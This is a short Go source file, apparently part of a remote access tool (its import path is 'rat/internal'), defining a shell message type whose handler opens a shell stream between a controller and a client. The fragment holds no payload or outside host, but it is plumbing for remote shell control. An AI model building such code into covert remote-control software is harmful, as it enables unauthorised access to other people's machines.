package main

import "rat/internal"

type ShellMessage struct {
	Action shared.ShellAction `json:"action"`
	Data   string             `json:"data"`
}

func (ShellMessage) Header() MessageHeader {
	return ShellEvent
}

func (m ShellMessage) Handle(controller *Controller, client *Client) error {
	switch m.Action {
	case shared.ShellStart:
		client.streamChan <- ShellChannel{controller}
	}

	return nil
}
